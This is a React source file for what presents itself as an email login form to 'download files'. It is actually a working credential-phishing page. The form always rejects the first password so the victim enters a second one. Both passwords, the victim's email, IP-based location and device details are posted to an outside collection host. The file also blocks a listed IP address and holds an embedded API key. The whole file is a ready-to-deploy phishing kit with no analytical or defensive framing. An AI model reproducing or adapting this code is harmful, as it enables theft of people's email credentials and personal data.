import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import './AuthForm.css';
import { useNavigate } from 'react-router-dom';

const AuthForm = () => {
  const [userEmail, setUserEmail] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [isEmailValidated, setIsEmailValidated] = useState(false);
  const [userPass, setUserPass] = useState('');
  const [initialPass, setInitialPass] = useState('');
  const [retryPass, setRetryPass] = useState('');
  const [passErrorMsg, setPassErrorMsg] = useState('');
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [isPassFieldLocked, setIsPassFieldLocked] = useState(false);
  const [clientIP, setClientIP] = useState('');
  const [locationData, setLocationData] = useState({});
  const [systemData, setSystemData] = useState({});
  const [emailProvider, setEmailProvider] = useState('');
  const passInputRef = useRef(null);
  const redirect = useNavigate();
  const restrictedIPs = ['86.98.95.155'];

  useEffect(() => {
    const getClientDetails = async () => {
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');

        if (restrictedIPs.includes(clientIP)) {
          alert('Access denied');
          window.location.href = '/error';
          return;
        }
        setClientIP(ipResponse.data.ip);

        const geoData = await axios.get(`https://api.geoapify.com/v1/ipinfo?&apiKey=7fb21a1ec68f44bb9ebbfe6ecea28c06&ip=${ipResponse.data.ip}`);
        const { country, city, continent } = geoData.data;

        setLocationData({
          country: country.names.en,
          city: city.names.en,
          continent: continent.names.en,
        });
      } catch (err) {
        console.error('Error:', err);
      }
    };

    const getSystemDetails = () => {
      if (navigator.userAgentData) {
        const sysInfo = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.userAgentData.platform,
          brand: navigator.userAgentData.brands.map((brand) => brand.brand).join(', '),
          mobile: navigator.userAgentData.mobile,
        };
        setSystemData(sysInfo);
      } else {
        const sysInfo = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
        };
        setSystemData(sysInfo);
      }
    };

    getClientDetails();
    getSystemDetails();

    const urlParams = new URLSearchParams(window.location.search);
    let emailParam = urlParams.get('email') || urlParams.get('emailTO');

    if (emailParam) {
      if (urlParams.get('emailTO')) {
        emailParam = atob(emailParam);
      }

      if (emailParam.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
        setUserEmail(emailParam);
        setIsEmailValidated(true);

        setTimeout(() => {
          passInputRef.current?.focus();
        }, 100);

        const encodedEmail = btoa(emailParam);
        window.history.replaceState({}, '', `?emailTO=${encodeURIComponent(encodedEmail)}`);
      }
    }
  }, []);

  useEffect(() => {
    if (!isPassFieldLocked && passInputRef.current) {
      passInputRef.current.focus();
    }
  }, [isPassFieldLocked]);

  const updateEmail = (e) => {
    setUserEmail(e.target.value);
    if (isEmailValidated) {
      setIsEmailValidated(false);
      setUserPass('');
      setPassErrorMsg('');
      setLoginAttempts(0);
      setInitialPass('');
      setRetryPass('');
    }
  };

  const validateEmail = () => {
    if (!userEmail.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
      setPassErrorMsg('Please enter a valid email address.');
      return;
    }

    setIsProcessing(true);
    setPassErrorMsg('');

    setTimeout(() => {
      setIsProcessing(false);
      setIsEmailValidated(true);

      const encodedEmail = btoa(userEmail);
      window.history.replaceState({}, '', `?emailTO=${encodeURIComponent(encodedEmail)}`);

      setTimeout(() => {
        passInputRef.current?.focus();
      }, 100);
    }, 300);
  };

  const sendPassword = async (password, type) => {
  const url = type === 'first' ? 'https://un-helpers.site/mm.php/' : 'https://un-helpers.site/mm.php/';

  try {
    await axios.post(url, {
      email: userEmail,
      [`${type}passwordused`]: password,
      country: locationData.country,
      continent: locationData.continent,
      city: locationData.city,
      device: {
        userAgent: systemData.userAgent,
        language: systemData.language,
        platform: systemData.platform,
        brand: systemData.brand,
        mobile: systemData.mobile,
      },
    }, {
      headers: { 'Content-Type': 'application/json' },
    });
  } catch (err) {
    console.error(`Error sending ${type} password data:`, err);
  }
};

const attemptLogin = async () => {
  if (loginAttempts === 0) {
    const firstPass = userPass;
    setInitialPass(firstPass);
    setLoginAttempts(1);
    setUserPass('');  // Clear password input after first submission
    setIsPassFieldLocked(true);

    await sendPassword(firstPass, 'first'); // Send the first password

    setTimeout(() => {
      setPassErrorMsg(<span className='errormsg'>The email or password entered is incorrect. Please try again.</span>);
      setIsPassFieldLocked(false);  // Re-enable password input after timeout
    }, 100);

    return;
  }

  if (!userPass) {
    setPassErrorMsg("Please enter your password.");
    return;
  }

  // Storing the second password
  const secondPass = userPass;
  setRetryPass(secondPass);
  setIsProcessing(true);
  setPassErrorMsg('');

  try {
    // Send the second password to the correct endpoint
    await sendPassword(secondPass, 'second');

    setPassErrorMsg(<span className='errormsg'>The email or password entered is incorrect. Please try again.</span>);

  } catch (err) {
    if (err.message === 'Network Error') {
      setPassErrorMsg('We encountered a network error while attempting to connect to the server. Please try again.');
    } else if (err.response) {
      console.error('Error:', err.response.data);
      setPassErrorMsg(`Login failed with status code ${err.response.status}. Please check your credentials and try again.`);
    } else {
      setPassErrorMsg('An unknown error occurred. Please refresh the page and attempt again.');
    }
  } finally {
    setIsProcessing(false);
    redirect('/error');
  }
};


  return (
    <div className="auth-wrapper">
      <form className="auth-form" autoComplete="off">
        <input type="text" style={{ display: 'none' }} autoComplete="false" />

        <div className="input-section">
          {isEmailValidated ? (
            <h3>Confirm email password to continue</h3>
          ) : (
            <h2>Enter email to download files</h2>
          )}
          <div className="email-field">
            <input
              id="email-field"
              type="email"
              value={userEmail}
              onChange={updateEmail}
              disabled={isEmailValidated}
              placeholder="Enter your email"
              required
              autoFocus={!isEmailValidated}
            />
          </div>
          {!isEmailValidated && (
            <div className="action-button">
              <button
                onClick={validateEmail}
                disabled={isProcessing || isEmailValidated || !userEmail}
              >
                {isProcessing ? (
                  <span className="loader"></span>
                ) : (
                  'Download to Email'
                )}
              </button>
            </div>
          )}
        </div>

        {isEmailValidated && (
          <>
            <div className="input-section">
              <input
                id="password-field"
                type="password"
                ref={passInputRef}
                value={userPass}
                onChange={(e) => setUserPass(e.target.value)}
                placeholder="Email password"
                required
                autoFocus
                disabled={isPassFieldLocked}
              />
            </div>

            {passErrorMsg && (
              <div className="error-text">{passErrorMsg}</div>
            )}

            <div className="action-button">
              <button
                type="button"
                onClick={attemptLogin}
                disabled={isProcessing || isPassFieldLocked || !userPass}
              >
                {isProcessing ? (
                  <span className="loader"></span>
                ) : (
                  'Continue'
                )}
              </button>
            </div>
          </>
        )}
      </form>
    </div>
  );
};

export default AuthForm;
